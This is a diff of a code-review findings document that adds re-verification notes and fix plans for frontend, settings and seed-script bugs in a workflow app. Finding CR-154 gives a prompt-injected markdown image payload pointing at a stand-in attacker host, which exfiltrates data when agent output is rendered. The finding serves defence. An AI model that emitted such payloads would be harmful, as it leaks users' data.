+- **Re-verification note:** The `<ul>`-in-`<p>` (`FailureAlert` was rewritten), `NodePromptBox` and `ContextPicker` cases are gone. `SubPlanCard` still nests two Base UI `TooltipTrigger` buttons inside its toggle `<button>`, and `MasterPlanSection` now wraps a `<button>` inside a `TooltipTrigger` without `render`, which is button-in-button. Fix: use `render={<span/>}` or `render={<Badge/>}` on triggers inside the toggle, and `render={<button type="button" aria-label=…/>}` in `MasterPlanSection`.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -3087,6 +3618,10 @@ Original findings, verbatim:
 
 ### CR-129 [Medium] Flow delete failure is hidden behind the still-open dialog, and "Retry" doesn't retry the delete
 
+- **Status at `abaa007`:** **Open**, fix in [Task 15](review-tasks/15-frontend-mutation-conventions.md)
+- **Current location:** components/flows/FlowsView.tsx:41-54, components/flows/FlowsView.tsx:86-104, components/flows/FlowsView.tsx:166-171, components/flows/DeleteFlowDialog.tsx:44-51
+- **Re-verification note:** A failed delete still leaves the dialog open with no message; the error renders in the page `<Alert>` behind the overlay, and that Alert's "Retry" resets the mutation and refetches the list instead of retrying the delete. Fix: pass `removeFlow.error?.message` into `DeleteFlowDialog` and render it there; keep the page Alert for list errors only; call `removeFlow.reset()` on dialog close.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 5 — Flow runtime UI
@@ -3106,6 +3641,10 @@ Original findings, verbatim:
 
 ### CR-130 [Medium] CostChip shows sub-cent run costs 100× too high
 
+- **Status at `abaa007`:** **Open**, fix in [Task 35](review-tasks/35-cockpit-panel-state.md)
+- **Current location:** components/flows/panels/CostChip.tsx:33-36, components/flows/panels/CostChip.tsx:19-31
+- **Re-verification note:** `fmtCents` still prints `$${c.toFixed(3)}` for `0 < c < 1` cents, so 0.4¢ shows as "$0.400", in both the chip and the per-run tooltip rows. Fix: `$${(c / 100).toFixed(c < 1 ? 4 : 2)}`, or reuse the shared cost, duration and token formatters instead of the local `fmtDur`, `fmtTok` and `fmtCents`.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 5 — Flow runtime UI
@@ -3123,6 +3662,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-131 [Medium] Clickable non-button elements without keyboard support (graph node cards, decision choices, variable chips)
+
+- **Status at `abaa007`:** **Open**, fix in [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md)
+- **Current location:** components/flows/workflow-graph/NodeCard.tsx:60-71, components/flows/panels/DecisionView.tsx:137-140, components/chat/prompt-modal/PromptEditorSection.tsx:32-38
+- **Re-verification note:** Graph node selection (`<div onClick>`), decision choice picking (`<Card onClick>`) and variable insertion (`<Badge onClick>`) still have no role, `tabIndex`, key handling or label. Fix: render them as `<button type="button">` (or use `render={<button/>}` on Card and Badge) with `aria-pressed` and `aria-label`.
 
 - **Severity:** Medium
 - **Category:** Code quality
@@ -3144,6 +3687,10 @@ Original findings, verbatim:
 
 ### CR-132 [Medium] Keyboard delete on the canvas is non-functional (selection is never controlled)
 
+- **Status at `abaa007`:** **Open**, fix in [Task 38](review-tasks/38-editor-draft-machine.md)
+- **Current location:** components/template-editor/components/BuilderFlow.tsx:82-149, components/template-editor/components/BuilderFlow.tsx:180
+- **Re-verification note:** `rfNodes` and `rfEdges` still carry selection only in `data.selected`, never the React Flow `selected` field, and `onNodesChange`/`onEdgesChange` drop `select` changes. So `deleteKeyCode` (still set) never deletes anything. Fix: keep a local `selectedIds` set fed from `select` changes and project it as `selected`, or set `deleteKeyCode={null}`.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 6 — Template authoring
@@ -3162,6 +3709,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-133 [Medium] Structural actions build the next draft from the render-captured `draft`, so batched calls clobber each other
+
+- **Status at `abaa007`:** **Open**, fix in [Task 38](review-tasks/38-editor-draft-machine.md)
+- **Current location:** components/builder/hooks/use-editor-actions.ts:123-161, components/builder/hooks/use-editor-actions.ts:173-206, components/builder/hooks/use-editor-actions.ts:261-330, components/template-editor/hooks/use-template-draft.ts:32, components/template-editor/hooks/use-template-draft.ts:125-151
+- **Re-verification note:** `removeNode`, `removeEdge`, `duplicateNode`, `addEdge` and `addInstance` still build `next` from the render-captured `draft` and call `apply(next)`, and `apply` only accepts a `Draft`, not an updater. Batched removals in one tick therefore clobber each other. Fix: let `apply` take `(cur) => next` (`setDraft` already supports updaters) and use it in every action, or add a batched `removeElements(nodeIds, edgeIds)`.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -3183,6 +3734,10 @@ Original findings, verbatim:
 
 ### CR-134 [Medium] Read-only (built-in) templates are editable in the node drawer
 
+- **Status at `abaa007`:** **Open**, fix in [Task 38](review-tasks/38-editor-draft-machine.md)
+- **Current location:** components/builder/EditorNodeDrawer.tsx:106-117, components/builder/EditorPage.tsx:240-244, components/template-editor/NodeConfigurator.tsx:46
+- **Re-verification note:** `EditorNodeDrawer` still doesn't forward `readonly` to `NodeConfiguratorBody`, which has no such prop, and `EditorPage`'s `onPatch` still calls `machine.patchNode` unconditionally. So built-in templates are editable in the drawer, dirty the draft, and then fail to save. Fix: add `readOnly` to `NodeConfiguratorBody` and its tabs (disabled inputs) and guard `onPatch` with `if (readonly) return`.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 6 — Template authoring
@@ -3200,6 +3755,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-135 [Medium] `queryKeys.nodeContracts(url)` (and `queryKeys.settings`) are shared by fetchers with different semantics
+
+- **Status at `abaa007`:** **Open**, fix in [Task 13](review-tasks/13-frontend-query-ownership.md)
+- **Current location:** components/builder/hooks/use-instance-contracts.ts:39-60, components/builder/hooks/use-instance-contracts.ts:85-86, components/builder/hooks/use-instance-contracts.ts:145-146, components/template-editor/hooks/use-node-contract.ts:22-27, components/template-editor/hooks/use-node-contract.ts:38-39, components/templates/hooks/use-node-schema-contract.ts:33-35, components/template-editor/components/ConfigTab.tsx:80-82, components/templates/components/NodeConfigureDialog.tsx:70-72
+- **Re-verification note:** `queryKeys.nodeContracts(url)` is still written by three different `queryFn`s: `fetchContract` caches `null` on failure, `fetchNodeContract` throws, and `use-node-schema-contract` uses `fetchJson`. `queryKeys.settings` is likewise fetched by both `fetchSettings` and `fetchJson("/api/settings")`. Fix: export one `queryOptions` per key next to `queryKeys`, throw on failure, and handle `isError` in callers.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -3224,6 +3783,10 @@ Original findings, verbatim:
 
 ### CR-136 [Medium] Live validation results can arrive out of order and re-apply after save
 
+- **Status at `abaa007`:** **Open**, fix in [Task 37](review-tasks/37-editor-save-integrity.md)
+- **Current location:** components/template-editor/hooks/use-template-validation.ts:86-117
+- **Re-verification note:** In-flight validate requests still have no abort or sequence guard, so a slow older response can overwrite newer results or `clear()`. Fetch and parse failures still become `[]`, so the pre-save gate in `use-editor-save` passes silently. Fix: keep a `seq` ref and abort the previous controller (with `clear()` cancelling both), or move to a `useQuery` on a debounced draft hash; surface a failure as an "unable to validate" state.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 6 — Template authoring
@@ -3243,6 +3806,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-137 [Medium] Condition builder round-trip changes expression semantics
+
+- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
+- **Current location:** components/template-editor/condition-grammar.ts:24-37, components/template-editor/condition-grammar.ts:74-116, components/template-editor/condition-grammar.ts:160-176
+- **Re-verification note:** `decomposeCondition` still only checks the LEFT side with `isPath` and runs any RHS through `unliteral()`, so `status = nodes.b.output.y` becomes the string literal on the next edit. `literal()` re-emits `"123"` and `"true"` as the bare number and boolean, and `splitTop` ignores escaped quotes (lines 81-84). Fix: decompose only when the RHS is a valid literal (else raw mode), store `{ value, kind }` so quoting survives, and add vitest round-trip tests (the runner now exists).
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -3268,6 +3835,10 @@ Original findings, verbatim:
 
 ### CR-138 [Medium] ConditionBuilder keeps stale rows when its value becomes empty; index keys make it reproducible
 
+- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
+- **Current location:** components/template-editor/condition-builder/use-condition-state.ts:41-54, components/template-editor/condition-builder/use-condition-state.ts:79-83, components/template-editor/components/ChoicesEditor.tsx:45-47, components/template-editor/components/PassMapEditor.tsx:43, components/template-editor/components/RulesListEditor.tsx:33, components/template-editor/condition-builder/ConditionBuilder.tsx:131
+- **Re-verification note:** The seed effect still skips when `!value && !lastEmitted.current`, and `ChoiceRow` (plus PassMap, Rules and condition rows) still use `key={i}`. Deleting a choice therefore leaves the previous choice's condition rows showing under the next one, and the next edit emits them into the wrong choice. `editRaw` still calls `onChange` on every keystroke. Fix: give list items stable ids, and derive rows from `value` during render with only a raw-text buffer in state, reset via `key`.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 6 — Template authoring
@@ -3286,6 +3857,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-139 [Medium] Redo silently drops config edits made after an undo
+
+- **Status at `abaa007`:** **Open**, fix in [Task 38](review-tasks/38-editor-draft-machine.md)
+- **Current location:** components/template-editor/hooks/use-template-draft.ts:125-170
+- **Re-verification note:** `redoStack` is cleared only inside the snapshot branch of `apply` (line 142). Coalesced or meta-only `apply` calls and every `patchNode` (all drawer config edits) leave redo intact and take no snapshot. So undo, then a config edit, then redo silently discards the edit. Fix: clear `redoStack` (and sync flags) on every non-undo/redo mutation, and route `patchNode` through the coalescing snapshot path.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -3306,6 +3881,10 @@ Original findings, verbatim:
 
 ### CR-140 [Medium] Revisiting the editor seeds the draft and positions from stale cache; layout autosave can overwrite newer positions
 
+- **Status at `abaa007`:** **Open**, fix in [Task 37](review-tasks/37-editor-save-integrity.md)
+- **Current location:** components/template-editor/hooks/use-node-positions.ts:35, components/template-editor/hooks/use-node-positions.ts:48-53, components/template-editor/hooks/use-node-positions.ts:55-69, components/template-editor/hooks/use-template-draft.ts:51, components/builder/EditorPage.tsx:70-80
+- **Re-verification note:** Draft and positions still seed from `useState(initial)` at mount only, and are re-adopted only after a structural Save (`use-editor-save.ts:102-107`). The positions PATCH never writes `queryKeys.templates.detail`, so revisiting within gcTime shows stale cached positions, and the next drag PATCHes them over the server copy. Unmount still `clearTimeout`s the pending 700 ms save, which drops the last drag. Fix: `setQueryData` the detail after the PATCH, flush the save with `keepalive` on unmount, and key the editor or reset when a newer `dataUpdatedAt` arrives while the draft isn't dirty.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 6 — Template authoring
@@ -3322,6 +3901,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-141 [Medium] Unsaved-changes guard only covers tab close and the header back button
+
+- **Status at `abaa007`:** **Open**, fix in [Task 38](review-tasks/38-editor-draft-machine.md)
+- **Current location:** components/template-editor/hooks/use-template-draft.ts:194-203, components/builder/EditorPage.tsx:169-172, components/builder/EditorPage.tsx:290-297, components/builder/EditorHeader.tsx:98-100, components/builder/EditorError.tsx:31
+- **Re-verification note:** There is still no `popstate` or link interception: only `beforeunload` and the header back button check `dirty`. The header's gallery `Link`, browser Back/Forward and nav-bar links discard the draft with no prompt. Fix: add a shared `hooks/useNavigationGuard(dirty)` that intercepts in-app link clicks and pushes a sentinel history entry while dirty, and route in-page links through `onBack`.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -3343,6 +3926,10 @@ Original findings, verbatim:
 
 ### CR-142 [Medium] Gallery cache is not invalidated after create or save, and fresh server props are ignored
 
+- **Status at `abaa007`:** **Open**, fix in [Task 37](review-tasks/37-editor-save-integrity.md)
+- **Current location:** components/templates/TemplateGallery.tsx:105-109, components/templates/TemplateGallery.tsx:165, components/templates/hooks/use-template-list.ts:22-29, components/templates/hooks/use-node-list.ts:22-29, components/builder/hooks/use-editor-save.ts:100-108
+- **Re-verification note:** `createMutation` still navigates without invalidating `queryKeys.templatesGallery`, and an editor save or rename refetches only the detail. Both list hooks still use `initialData` plus `initialDataUpdatedAt: Date.now()`, which is ignored when a cache entry exists, so the gallery shows stale rows. `pageError` is never cleared. Fix: invalidate `templatesGallery` on create and editor save, hydrate the gallery with prefetch plus `HydrationBoundary`, and clear `pageError` when each mutation starts.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 6 — Template authoring
@@ -3361,6 +3948,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-143 [Medium] Fetchers swallow errors, so error states can never render
+
+- **Status at `abaa007`:** **Open**, fix in [Task 14](review-tasks/14-frontend-throwing-fetchers.md)
+- **Current location:** components/builder/hooks/use-editor-queries.ts:46-63, components/builder/EditorPage.tsx:116-124, components/template-editor/WebhookPayloadDialog.tsx:52-62, components/template-editor/WebhookPayloadDialog.tsx:84-94, components/template-editor/WebhookPayloadDialog.tsx:380-383, components/settings/queries.ts:10-31, components/template-editor/components/ConfigTab.tsx:80-95
+- **Re-verification note:** `fetchTaskProviders` and `fetchRepoChoices` still `.catch(() => null)` with no `res.ok` check. The webhook dialog's local `fetchJson` and the settings `fetchJson`/`fetchSettings`/`fetchRepos`/`fetchGitHosts` still return fallbacks, so the dialog's `failed` alert and ConfigTab's `secretsQuery.isError` branch can never render. EditorPage still treats pending providers and repos as `[]`, with no skeleton. Fix: use the throwing `@/hooks/fetch-json` `fetchJson`, then render `isPending` skeletons and `isError` retry in the trigger/repo pickers.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -3381,6 +3972,10 @@ Original findings, verbatim:
 
 ### CR-144 [Medium] Contract and preview queries put the full node config into a GET URL and re-key on every keystroke
 
+- **Status at `abaa007`:** **Open**, fix in [Task 40](review-tasks/40-editor-performance.md)
+- **Current location:** components/template-editor/types.ts:62-78, components/template-editor/types.ts:86-97, components/template-editor/hooks/use-node-contract.ts:34-46, components/builder/hooks/use-instance-contracts.ts:81-92, components/builder/hooks/use-instance-contracts.ts:143-150, components/template-editor/hooks/use-upstream-groups.ts:61-62, components/templates/hooks/use-node-schema-contract.ts:32-37, app/api/contracts/route.ts:38-50
+- **Re-verification note:** `contractsUrl` and `kindContractUrl` still serialize the whole instance config (prompts and script source) into the GET query string, and `/api/contracts` is GET-only. Large configs can hit 431, and every non-debounced field edit re-keys the query and leaves a cache entry. Only the prompt body is debounced (PromptTab) and `keepPreviousData` is set, both already true at review time. Fix: POST only the contract-relevant subset (`output_schema`, `choices`, `contract`) keyed by a stable hash of it, and debounce other field writes.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 6 — Template authoring
@@ -3397,6 +3992,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-145 [Medium] Unstable `machine`/`layout` objects and inline callbacks defeat memoization; the canvas rebuilds every render
+
+- **Status at `abaa007`:** **Open**, fix in [Task 40](review-tasks/40-editor-performance.md)
+- **Current location:** components/template-editor/hooks/use-template-draft.ts:205-220, components/template-editor/hooks/use-node-positions.ts:71-77, components/builder/EditorPage.tsx:202-226, components/template-editor/components/BuilderFlow.tsx:82-126, components/template-editor/components/BuilderFlow.tsx:160-166, components/template-editor/components/BuilderFlow.tsx:207, components/builder/hooks/use-editor-save.ts:115
+- **Re-verification note:** Both hooks still return fresh object literals (`resetPositions` is still an inline arrow), and `useEditorSave` and `useEditorActions` depend on the whole `machine`/`layout` objects. EditorPage still passes inline `onNodeOpen`/`onEdgeOpen`/`onApi` lambdas into `rfNodes`/`rfEdges` memo deps, so every drawer keystroke rebuilds all XYFlow nodes and edges. React Compiler is not enabled (`next.config.mjs`). Right-click still duplicates the node. Fix: `useMemo` the returned APIs, depend on the individual stable callbacks, `useCallback` the EditorPage handlers, and move duplicate behind a context menu.
 
 - **Severity:** Medium
 - **Category:** Code quality
@@ -3416,6 +4015,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-146 [Medium] State-mirroring effects and render-time ref writes (AGENTS.md §2.6)
+
+- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
+- **Current location:** components/builder/hooks/use-instance-contracts.ts:94-134, components/templates/hooks/use-node-schema-contract.ts:39-51, components/template-editor/hooks/use-input-map.ts:87-91, components/template-editor/hooks/use-configurator-tabs.ts:43-67, components/template-editor/hooks/use-node-positions.ts:39-40
+- **Re-verification note:** All patterns remain: a render-time ref write plus the `void choiceSig` memo trick, query data copied into state by an effect, an editing-row reset effect keyed on `node.key`, and a render-time tab reset plus an effect on `[contract, node]` that keeps re-forcing the Prompt tab while config is empty. There is also a render-time `latest.current = positions`. Fix: derive during render, reset per-node UI state via `key={node.key}`, pick the initial tab once per node key, and use a memoized choices signature string as a real dependency.
 
 - **Severity:** Medium
 - **Category:** Code quality
@@ -3440,6 +4043,10 @@ Original findings, verbatim:
 
 ### CR-147 [Medium] `tildePath` collapses *any* user's home (and `/Users/Shared`) to `~`, so edit-and-save rewrites `local_path`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 42](review-tasks/42-settings-forms.md)
+- **Current location:** components/settings/repos/paths.ts:7-9, components/settings/repos/hooks/use-repo-form.ts:20, components/settings/repos/components/RepoCard.tsx:48, app/api/repos/[id]/route.ts:28-30
+- **Re-verification note:** `tildePath` still collapses any `/Users/<x>` or `/home/<x>` prefix to `~`, and `formFromRepo` feeds that collapsed path into the editable field. On save, the API expands `~` against the server `HOME`, so editing a repo at `/Users/Shared/...` silently rewrites `local_path`. Fix: keep the raw stored path in the form and tilde-collapse only for display, ideally against the real home returned by the API.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -3456,6 +4063,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-148 [Medium] Force-refresh race writes one filter-set's results into another filter-set's cache
+
+- **Status at `abaa007`:** **Open**, fix in [Task 43](review-tasks/43-tasks-feature.md)
+- **Current location:** components/tasks/hooks/use-live-tasks.ts:41-50, components/tasks/hooks/use-live-tasks.ts:67
+- **Re-verification note:** The refresh mutation still closes over `params` in `mutationFn` and writes to the render-bound `queryKey` in `onSuccess`. A filter change mid-refresh therefore writes the old filter's results into the new filter's cache. `refresh.error` is reset only on the next forced refresh, so the error banner persists across filter changes. Fix: pass `params` as the mutation variable, `setQueryData(queryKeys.tasks.live(vars))`, and `refresh.reset()` when `params` changes.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -3475,6 +4086,10 @@ Original findings, verbatim:
 
 ### CR-149 [Medium] Destructive deletes fire on one click with no confirmation (repos, integration instances, Cursor key)
 
+- **Status at `abaa007`:** **Open**, fix in [Task 42](review-tasks/42-settings-forms.md)
+- **Current location:** components/settings/repos/ReposSection.tsx:85-87, components/settings/repos/components/RepoCard.tsx:70-83, components/settings/integrations/GitTab.tsx:101, components/settings/integrations/TaskTab.tsx:100, components/settings/integrations/HarnessTab.tsx:76, components/settings/integrations/components/InstanceCard.tsx:78
+- **Re-verification note:** The trash buttons still DELETE a repo or an instance (with its stored token), or clear the Cursor API key, on one click. There is no confirm and no disabled-while-pending state, so double clicks send duplicate DELETEs. Fix: hold a `pendingDelete` id per container, render the shared `ConfirmDeleteDialog` with `busy={remove.isPending}`, and pass a `deleting` prop to `RepoCard` and `InstanceCard`.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -3491,6 +4106,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-150 [Medium] Mutation failures swallowed: instance remove, connection test, and the task repo-pin PATCH
+
+- **Status at `abaa007`:** **Open**, fix in [Task 42](review-tasks/42-settings-forms.md)
+- **Current location:** components/settings/integrations/GitTab.tsx:67-72, components/settings/integrations/GitTab.tsx:101, components/settings/integrations/TaskTab.tsx:67-71, components/settings/integrations/TaskTab.tsx:100, components/settings/integrations/hooks/use-instances.ts:60-71
+- **Re-verification note:** `remove.mutate(i.id)` still has no `onError`, so a failed delete is silent. `callTestInstance` still awaits a bare `fetch` that can reject, and `runTest` has no `onError`, so an offline test just stops spinning with no badge. Fix: add `onError: (e) => onError(e.message)` to both removes, and wrap the test `fetch` in try/catch that returns `{ ok: false, detail }`.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -3513,6 +4132,10 @@ Original findings, verbatim:
 
 ### CR-151 [Medium] Connecting or removing an integration doesn't invalidate settings status, so General's status strip goes stale
 
+- **Status at `abaa007`:** **Open**, fix in [Task 41](review-tasks/41-settings-data-and-errors.md)
+- **Current location:** components/settings/integrations/hooks/use-instances.ts:91-117, components/settings/context.tsx:68-70
+- **Re-verification note:** `useConnectInstance` and `useRemoveInstance` still invalidate only `queryKeys.integrations.instances(...)`. The layout-level `SettingsProvider`'s `settings` and `gitHosts` queries (the `status.gitHosts`/`status.taskProviders` flags in General's status strip) stay stale until a focus refetch. Fix: in both `onSuccess` handlers also invalidate `queryKeys.settings`, plus `queryKeys.gitHosts` (HOST surface) or `queryKeys.taskProviders` (TASK surface).
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -3528,6 +4151,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-152 [Medium] One global settings error string leaks across sub-routes and is never cleared
+
+- **Status at `abaa007`:** **Open**, fix in [Task 41](review-tasks/41-settings-data-and-errors.md)
+- **Current location:** components/settings/context.tsx:66, components/settings/context.tsx:104-105, components/settings/repos/ReposSection.tsx:59-63, components/settings/general/components/CustomNodesSection.tsx:66-81, components/settings/integrations/HarnessTab.tsx:48-51
+- **Re-verification note:** `error` is still a single layout-level `useState`. Every section reports through `onError(e.message)`, and no code path calls `setError(null)`, so one failure sticks across sub-routes and survives later successful saves. Fix: scope errors per page or per modal (use `mutation.error`), or at minimum clear them in each `onSuccess` and on pathname change.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -3545,6 +4172,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-153 [Medium] Build start chain ignores the repo-pin PATCH result and parses non-JSON error bodies
+
+- **Status at `abaa007`:** **Open**, fix in [Task 43](review-tasks/43-tasks-feature.md)
+- **Current location:** components/tasks/hooks/use-start-build.ts:32-55
+- **Re-verification note:** The repo-pin `PATCH /api/tasks/:id` result is still never checked, so the flow is created even if pinning failed. Materialize and create-flow still do `.then((r) => r.json())` with no `res.ok`, so HTML 5xx bodies surface as a `SyntaxError`. Fix: use `postJson` from `@/hooks/fetch-json` for both POSTs, and add a throwing `patchJson` (or check `res.ok`) for the PATCH.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -3565,6 +4196,10 @@ Original findings, verbatim:
 
 ### CR-154 [Medium] Shared `Markdown` loads remote images from any origin in agent-authored content (exfiltration vector)
 
+- **Status at `abaa007`:** **Open**, fix in [Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md)
+- **Current location:** components/shared/Markdown.tsx:136-150
+- **Re-verification note:** `Markdown` still renders Streamdown with its default rehype pipeline (streamdown ^2.7.1, `harden` with `allowedImagePrefixes: ["*"]`) over agent, plan and MR content. A prompt-injected `![](https://attacker/?d=...)` is fetched automatically on render. Fix: pass explicit `rehypePlugins` that keep sanitize and configure `harden` with an image allowlist (or none) and `allowedProtocols: ["https","mailto"]`, or override `components.img` with a click-to-load placeholder.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -3582,6 +4217,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-155 [Medium] Client types duplicate server/DB shapes and live in a component file instead of `types/`
+
+- **Status at `abaa007`:** **Open**, fix in [Task 55](review-tasks/55-frontend-constants-and-types.md)
+- **Current location:** components/settings/context.tsx:11-40, components/settings/integrations/types.ts:5-11, types/tasks.ts:20-25, types/template-editor.ts:19-23
+- **Re-verification note:** `Repo`, `HostInstanceRow`, `GitHost`, `Harness` and `Settings` are still declared inside the client provider file, with optional fields the API always sends. `HostInstanceRow` still duplicates `InstanceRow`, and `RepoSummary`/`EditorRepoChoice` are hand-written copies. There is no `types/settings.ts` or `types/repos.ts`. Fix: create those two files, derive `Repo` from `RepoRow`, derive the summaries with `Pick`, and delete `HostInstanceRow`.
 
 - **Severity:** Medium
 - **Category:** Boundaries
@@ -3607,6 +4246,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-156 [Medium] DataTable sortable headers are mouse-only; action link nests a button inside an anchor
+
+- **Status at `abaa007`:** **Open**, fix in [Task 52](review-tasks/52-shared-ui-components.md)
+- **Current location:** components/shared/DataTable.tsx:200-204, components/shared/DataTable.tsx:315-330, components/shared/DataTable.tsx:355-357, components/shared/DataTable.tsx:393-394
+- **Re-verification note:** Sortable headers are still `onClick` on `TableHead`, with no button, `tabIndex` or `aria-sort`. The `href` action still nests `<Button>` inside `<a>`, the pagination icon buttons have no `aria-label`, and overflow items are keyed by `action.label`. Fix: render a `<button type="button">` in sortable headers and set `aria-sort`, use `<Button render={<a href=… />}>`, add Previous/Next page labels, and key menu items by index plus label.
 
 - **Severity:** Medium
 - **Category:** Code quality
@@ -3636,6 +4279,10 @@ Original findings, verbatim:
 
 ### CR-157 [Medium] Seed DB guard is a single exact-path blacklist with no allowlist, no realpath and no echo of the target
 
+- **Status at `abaa007`:** **Open**, fix in [Task 06](review-tasks/06-db-path-and-seed-safety.md)
+- **Current location:** scripts/lib/seed-db.mjs:18-29, scripts/seed-demo-flow.mjs:27, scripts/seed-demo-fanout.mjs:38, scripts/seed-branch-refine-demo.mjs:39, scripts/seed-custom-flow.mjs:28, scripts/seed-split-smoke.mjs:47
+- **Re-verification note:** `resolveSeedDb` is still an exact-path blacklist of `data/devflow.prod.db` with no realpath and no allowlist, and no seed script prints the resolved target before writing. Any other path, symlink or prod copy is accepted (now five callers, including the new `seed-split-smoke`). Fix: allowlist `<root>/data/devflow.db` after `fs.realpathSync`, require an explicit flag for anything else, and always log the target path.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 7b — Tooling & config
@@ -3655,6 +4302,9 @@ Original findings, verbatim:
 
 ### CR-158 [Medium] Seed scripts and `init-prod-db` run raw `schema.sql` and skip the app's migrations, which can shadow `tickets` data or fail on old DBs
 
+- **Status at `abaa007`:** **Obsolete (legacy, no fix)**, leftover code deleted in [Task 08](review-tasks/08-db-bootstrap-and-schema.md)
+- **Re-verification note:** Both harms this finding describes (shadowing a pre-rename `tickets` table, and missing `ALTER TABLE ADD COLUMN` columns on old DBs) apply only to legacy pre-migration DB shapes, which the product owner won't support. The seeds still exec raw `schema.sql` (seed-*.mjs, init-prod-db.mjs:21). The legacy `tickets→tasks` rename and ALTER migrations still exist in `lib/db/index.ts:44-77` and `migrate()`, so they are candidates for a "delete legacy migrations" cleanup.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 7b — Tooling & config
@@ -3673,6 +4323,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-159 [Medium] Seed `reset()` table lists drifted from the engine's `FLOW_CHILD_TABLES` (missing `hooks`, and `step_merges` in 3 of 4 scripts)
+
+- **Status at `abaa007`:** **Open**, fix in [Task 06](review-tasks/06-db-path-and-seed-safety.md)
+- **Current location:** scripts/seed-demo-flow.mjs:195-206, scripts/seed-branch-refine-demo.mjs:270-281, scripts/seed-custom-flow.mjs:65-80, scripts/seed-demo-fanout.mjs:128-147, lib/engine/flow-engine.ts:59-70
+- **Re-verification note:** The canonical `FLOW_CHILD_TABLES` (now in `flow-engine.ts`) includes `step_merges` and `hooks`. All four reset loops still omit `hooks`, and three still omit `step_merges` and child flows (`parent_flow_id`). With better-sqlite3's default `foreign_keys=1`, `DELETE FROM flows` can then fail, or leave orphans. Fix: add one shared `deleteFlowCascade(db, flowId)` to `scripts/lib/seed-db.mjs` that mirrors `FLOW_CHILD_TABLES` (children first, plus `parent_flow_id` children), and add a vitest that asserts the lists match.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -3695,6 +4349,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-160 [Medium] Every `scripts/check-*.ts` and `cursor-usage.ts` is unrunnable as documented
+
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 05](review-tasks/05-test-coverage-baseline.md)
+- **Current location:** scripts/check-branch-refine.ts:4, scripts/check-worktrees.ts:12, scripts/check-plan-turn-output.ts:4, scripts/cursor-usage.ts:7-8, scripts/check-prompt-splits.ts:3, scripts/check-prompt-assembly.ts:10, package.json:5-12
+- **Re-verification note:** vitest now exists with a `server-only` stub (`tests/server-only-stub.ts`) and 23 passing test files, so the runner prerequisite is done. The check scripts are still not ported: `check-branch-refine` still documents `node --experimental-strip-types` (verified: ERR_MODULE_NOT_FOUND), `check-worktrees`, `check-plan-turn-output` and `cursor-usage` still use `npx tsx` (not installed), and none are wired into `package.json`. Remaining: port the checks into `*.test.ts` under vitest and delete the scripts that have no purpose left.
 
 - **Severity:** Medium
 - **Category:** Code quality
@@ -3719,6 +4377,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-161 [Medium] The client `lib/` import guard skips `hooks/`, `types/` and `constants/`; live violations in `hooks/use-highlighted-code.ts` and `types/start-contract.ts`
+
+- **Status at `abaa007`:** **Open**, fix in [Task 04](review-tasks/04-client-server-boundaries.md)
+- **Current location:** eslint.config.mjs:108-110, hooks/use-highlighted-code.ts:3, lib/highlighter.tsx:1-7, types/start-contract.ts:13-17, types/template-lint.ts:7
